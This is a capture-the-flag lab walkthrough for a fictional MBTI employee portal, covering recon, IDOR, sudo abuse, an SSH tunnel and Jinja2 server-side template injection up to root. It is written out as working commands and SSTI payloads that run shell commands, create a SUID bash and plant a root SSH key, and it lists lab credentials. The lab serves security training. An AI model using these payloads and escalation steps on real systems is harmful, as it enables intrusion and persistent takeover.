# MBTI IDOR Lab - Complete Attack Chain

## Overview
This lab simulates a complete penetration testing scenario with multiple privilege escalation paths.

## Attack Chain

### Phase 1: Reconnaissance & Initial Access
**Target**: `mbti.local` (Main website) and `portal.mbti.local` (Employee Portal)

1. **Subdomain Enumeration**
   ```bash
   ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
        -H "Host: FUZZ.mbti.local" -u http://TARGET_IP/ -mc all
   ```
   Find: `portal.mbti.local`

2. **Service Discovery**
   ```bash
   nmap -sV -sC TARGET_IP
   ```
   Discover: HTTP (80), LDAP (389), NFS (2049)

### Phase 2: IDOR Vulnerability Exploitation
**Vulnerability**: Insecure Direct Object Reference in Employee Portal

1. **Login with Known Credentials**
   - Username: `MBTI2024837` (Peter Schneider)
   - Password: `tekelomuxo`
   - Access: `http://portal.mbti.local/dashboard?uid=MBTI2024837`

2. **Exploit IDOR**
   - Modify URL parameter: `?uid=MBTI2024001` (other employees)
   - Note: Client-side access control shows "Access Denied"
   - **Goal**: Find a way to bypass or exploit this

3. **Enumerate Other Users**
   - Brute force UIDs: `MBTI2024001` through `MBTI2024999`
   - Find valid employee IDs and gather information

### Phase 3: Web Shell / Initial Foothold
**Goal**: Get shell access as `www-data`

**Methods**:
1. SQL Injection (if database is exposed)
2. File upload vulnerability (if present)
3. RCE through vulnerable PHP endpoint
4. Exploit React/PHP backend

Once shell is obtained:
```bash
# You are now www-data
whoami  # www-data
```

### Phase 4: Privilege Escalation to Developer
**Method**: Sudo misconfiguration

1. **Check Sudo Privileges**
   ```bash
   sudo -l
   ```
   Output:
   ```
   User www-data may run the following commands:
       (developer) NOPASSWD: /usr/local/bin/log_rotation.py
       (developer) NOPASSWD: /usr/local/bin/system_monitor.py
       (developer) NOPASSWD: /usr/local/bin/manage_containers.py
   ```

2. **Exploit Python Script**
   ```bash
   # Run script as developer user
   sudo -u developer /usr/local/bin/system_monitor.py
   
   # Or get shell through Python
   sudo -u developer /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```

3. **Gain Developer Shell**
   ```bash
   # You are now developer
   whoami  # developer
   cd /home/developer
   ```

### Phase 5: Discover Internal Service
**Goal**: Find the hidden Flask application running on localhost

**Note**: As `www-data`, you CANNOT see this port or the process because:
- The app directory has `700` permissions (only developer can access)
- The process runs as the `developer` user
- You must escalate to `developer` first!

1. **After becoming developer, check for processes**
   ```bash
   ps aux | grep python
   ```
   Find: `/usr/bin/python3 /home/developer/internal_app/app.py` (running as developer!)

2. **Port Scanning**
   ```bash
   ss -tlnp
   netstat -tlnp
   ```
   Discover: Port `5000` listening on `127.0.0.1`

3. **Access Internal Dashboard**
   ```bash
   # From attacker machine, setup SSH tunnel
   ssh -L 5000:127.0.0.1:5000 developer@TARGET_IP
   
   # Browse to http://localhost:5000
   ```

### Phase 6: SSTI to Root
**Vulnerability**: Server-Side Template Injection (Jinja2)

1. **Test for SSTI**
   - In "Service Name" field, enter: `{{7*7}}`
   - If output shows `49`, SSTI confirmed!

2. **Exploit SSTI for RCE**
   
   **Payload 1: Verify RCE**
   ```python
   {{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
   ```
   Expected: `root`

   **Payload 2: Read Root Flag**
   ```python
   {{''.__class__.__mro__[1].__subclasses__()[396]('cat /root/flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
   ```

   **Payload 3: Create SUID Bash**
   ```python
   {{''.__class__.__mro__[1].__subclasses__()[396]('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash',shell=True,stdout=-1).communicate()}}
   ```

3. **Execute SUID Bash**
   ```bash
   # Back in SSH session as developer
   /tmp/rootbash -p
   
   # You are now root!
   whoami  # root
   id      # uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root)
   ```

4. **Alternative: Add SSH Key**
   ```python
   {{''.__class__.__mro__[1].__subclasses__()[396]('mkdir -p /root/.ssh && echo "ssh-rsa YOUR_PUBLIC_KEY" > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys',shell=True,stdout=-1).communicate()}}
   ```
   Then: `ssh root@TARGET_IP`

## Summary of Vulnerabilities

1. ✅ **IDOR**: Insecure Direct Object Reference in employee portal
2. ✅ **Sudo Misconfiguration**: www-data can run Python scripts as developer
3. ✅ **SSTI**: Server-Side Template Injection in Flask app
4. ✅ **Privilege Escalation**: Flask app with SSTI running as developer gives path to root

## Security Note

The internal Flask dashboard is **NOT accessible to www-data**:
- Directory permissions: `700` (only developer can read/execute)
- App file permissions: `600` (only developer can read)
- Process runs as `developer` user, not root
- This forces attackers to escalate to developer first before finding the dashboard
- More realistic scenario: internal tools are not world-readable

## Complete Attack Timeline

```
1. Recon → Find portal.mbti.local
2. IDOR → Access other users' data
3. Web Shell → Get www-data shell
4. Sudo → Escalate to developer user
5. Port Scan → Find internal Flask app on port 5000
6. SSH Tunnel → Access internal dashboard
7. SSTI → Exploit Jinja2 template injection
8. Root Shell → Game over!
```

## Credentials Summary

- **Employee Portal**: `MBTI2024837` / `tekelomuxo` (Peter Schneider)
- **Developer SSH**: `developer` / `cD$j$v8kFq67C1D`
- **Database Root**: `root` / `MB_R00t_P@ss_2024!`
- **LDAP Admin**: `cn=admin,dc=mbti,dc=local` / `admin`

## Flags

- `/home/developer/user.txt` - Developer flag
- `/root/root.txt` - Root flag

## Learning Objectives

1. Subdomain enumeration
2. IDOR vulnerability identification and exploitation
3. Privilege escalation through sudo misconfiguration
4. Internal service discovery
5. SSH port forwarding techniques
6. Server-Side Template Injection (SSTI)
7. Python sandbox escape for RCE
8. Complete kill chain from recon to root
